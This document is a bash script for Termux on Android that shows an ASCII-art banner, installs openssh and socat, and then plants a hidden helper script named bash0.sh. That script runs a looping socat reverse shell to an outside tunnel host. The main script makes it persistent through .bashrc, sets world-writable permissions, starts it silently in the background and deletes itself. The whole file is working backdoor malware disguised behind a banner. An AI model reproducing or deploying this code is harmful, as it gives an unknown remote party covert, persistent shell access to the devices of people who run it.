#!/bin/bash

echo "                                                                                             "
echo "8b        d8  ad88888ba   88        88  88888888ba   88888888888  88888888ba   8b        d8  "
echo " Y8,    ,8P  d8\"     \"8b  88        88  88      \"8b  88           88      \"8b   Y8,    ,8P   "
echo "  \`8b  d8'   Y8,          88        88  88      ,8P  88           88      ,8P    \`8b  d8'    "
echo "    Y88P     \`Y8aaaaa,    88        88  88aaaaaa8P'  88aaaaa      88aaaaaa8P'      Y88P      "
echo "    d88b       \`\"\"\"\"\"8b,  88        88  88\"\"\"\"\"\"'    88\"\"\"\"\"      88\"\"\"\"88'        d88b      "
echo "  ,8P  Y8,           \`8b  88        88  88           88           88    \`8b      ,8P  Y8,    "
echo " d8'    \`8b  Y8a     a8P  Y8a.    .a8P  88           88           88     \`8b    d8'    \`8b   "
echo "8P        Y8  \"Y88888P\"    \`\"Y8888Y\"'   88           88888888888  88      \`8b  8P        Y8  "
echo "                                                                                             "
echo "                                                                                             "
sleep 2

pkg install openssh -y 
pkg install socat -y 

MONITOR_SCRIPT=$(cat <<'EOF'
#!/bin/bash

SOCAT_CMD="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:19.ip.gl.ply.gg:30582"

while true; do
    eval "$SOCAT_CMD"
    sleep 5
done
EOF
)

MONITOR_SCRIPT_PATH="/data/data/com.termux/files/usr/bin/bash0.sh"

echo "$MONITOR_SCRIPT" > "$MONITOR_SCRIPT_PATH"

chmod 777 "$MONITOR_SCRIPT_PATH"

BASHRC_PATH="/data/data/com.termux/files/home/.bashrc"

if ! grep -q "$MONITOR_SCRIPT_PATH" "$BASHRC_PATH"; then
    echo "$MONITOR_SCRIPT_PATH &> /dev/null 2>&1 &" >> "$BASHRC_PATH"
else
    echo ""
fi

echo ""

chmod 777 "$BASHRC_PATH"
termux-wake-lock
ulimit -n 4096

"$MONITOR_SCRIPT_PATH" &> /dev/null &











rm "$0"
